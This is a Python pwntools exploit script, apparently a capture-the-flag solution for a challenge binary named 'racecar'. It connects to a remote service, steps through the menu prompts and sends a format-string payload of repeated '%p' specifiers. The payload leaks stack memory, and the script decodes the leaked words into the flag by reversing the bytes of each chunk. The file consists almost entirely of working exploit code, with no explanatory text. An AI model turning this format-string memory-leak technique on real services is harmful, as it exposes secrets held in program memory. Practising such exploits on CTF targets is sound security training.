#!/usr/bin/env python3

from pwn import *
try:
	context.log_level = 'ERROR'

	payload = b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'
	ip = '94.237.62.149' # replace with the IP of the target
	port = 42712 # replace with the port of the target	
	p = remote(ip, port) # Connect to the remote service

	# p = process('./racecar') # used for local testing
	p.sendlineafter(b'Name:', b'a')
	p.sendlineafter(b'Nickname:', b'aa')
	p.sendlineafter(b'>', b'2') #selectio 
	p.sendlineafter(b'>', b'2') # car
	p.sendlineafter(b'>', b'1') #circuit
	p.sendlineafter(b'>', payload)

	x = p.recv()
	x = p.recv().decode('utf-8')
	flag_hex_string = x.split('\n')[2]
	print(f'flag encoded: {flag_hex_string}')
	
	# === flag decoding ===
	flag_hex_string_array  = flag_hex_string.split(' ')
	flag = ''
	for piece in flag_hex_string_array:
		without_0x = piece[2:]
		try:
			blep = bytearray.fromhex(without_0x).decode('utf-8', errors='replace')
			blep = blep[::-1]
			flag += blep
		except:
			pass
	print(f'flag: {flag}')
except Exception as e:
	print(f'Exception {e}')
	
	

